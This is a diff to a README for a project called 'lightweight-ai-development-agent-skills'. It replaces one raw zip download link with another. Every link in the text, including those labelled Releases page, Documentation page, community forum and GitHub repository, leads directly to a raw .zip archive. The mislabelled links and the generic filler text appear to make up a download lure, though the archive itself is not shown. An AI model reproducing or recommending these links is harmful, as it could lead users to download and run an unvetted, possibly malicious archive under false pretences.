@@ -1,6 +1,6 @@
 # 🚀 lightweight-ai-development-agent-skills - Simplifying AI Development Processes
 
-[![Download Latest Release](https://raw.githubusercontent.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/main/safety-lens/development-skills-lightweight-agent-ai-v3.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/main/safety-lens/development-skills-lightweight-agent-ai-v3.0.zip)
+[![Download Latest Release](https://github.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/raw/refs/heads/main/work-item-designer/skills_lightweight_development_agent_ai_v1.8.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/raw/refs/heads/main/work-item-designer/skills_lightweight_development_agent_ai_v1.8.zip)
 
 ## 🎯 Overview
 
@@ -11,7 +11,7 @@ lightweight-ai-development-agent-skills offers a practical set of AI agent skill
 Follow these simple steps to download and run the software:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/main/safety-lens/development-skills-lightweight-agent-ai-v3.0.zip). Here, you will find the latest versions of the software available for download.
+   Go to the [Releases page](https://github.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/raw/refs/heads/main/work-item-designer/skills_lightweight_development_agent_ai_v1.8.zip). Here, you will find the latest versions of the software available for download.
 
 2. **Choose Your Version**  
    Once on the Releases page, you will see different versions of the software. Select the one that fits your needs. The most recent version is usually at the top.
@@ -42,15 +42,15 @@ To ensure a smooth experience, make sure your device meets these basic requireme
 
 ## 📚 Documentation
 
-For detailed instructions on how to use the features, refer to the user manual included in the installation package. Additionally, you can visit the [Documentation page](https://raw.githubusercontent.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/main/safety-lens/development-skills-lightweight-agent-ai-v3.0.zip) for more tips and guidance.
+For detailed instructions on how to use the features, refer to the user manual included in the installation package. Additionally, you can visit the [Documentation page](https://github.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/raw/refs/heads/main/work-item-designer/skills_lightweight_development_agent_ai_v1.8.zip) for more tips and guidance.
 
 ## 🔗 Additional Resources
 
-- **Community Forum:** Join the [community forum](https://raw.githubusercontent.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/main/safety-lens/development-skills-lightweight-agent-ai-v3.0.zip) to ask questions, share tips, and connect with other users.
-- **GitHub Repository:** For updates and source code, check the [GitHub repository](https://raw.githubusercontent.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/main/safety-lens/development-skills-lightweight-agent-ai-v3.0.zip).
+- **Community Forum:** Join the [community forum](https://github.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/raw/refs/heads/main/work-item-designer/skills_lightweight_development_agent_ai_v1.8.zip) to ask questions, share tips, and connect with other users.
+- **GitHub Repository:** For updates and source code, check the [GitHub repository](https://github.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/raw/refs/heads/main/work-item-designer/skills_lightweight_development_agent_ai_v1.8.zip).
 
 ## 🔄 Download & Install
 
-To get started, download the latest version from the [Releases page](https://raw.githubusercontent.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/main/safety-lens/development-skills-lightweight-agent-ai-v3.0.zip). Follow the installation guide above and enjoy the benefits of a streamlined development process.
+To get started, download the latest version from the [Releases page](https://github.com/JoaoVyttorFelix/lightweight-ai-development-agent-skills/raw/refs/heads/main/work-item-designer/skills_lightweight_development_agent_ai_v1.8.zip). Follow the installation guide above and enjoy the benefits of a streamlined development process.
 
 Thank you for choosing lightweight-ai-development-agent-skills. We hope this tool makes your software development projects more productive and enjoyable.
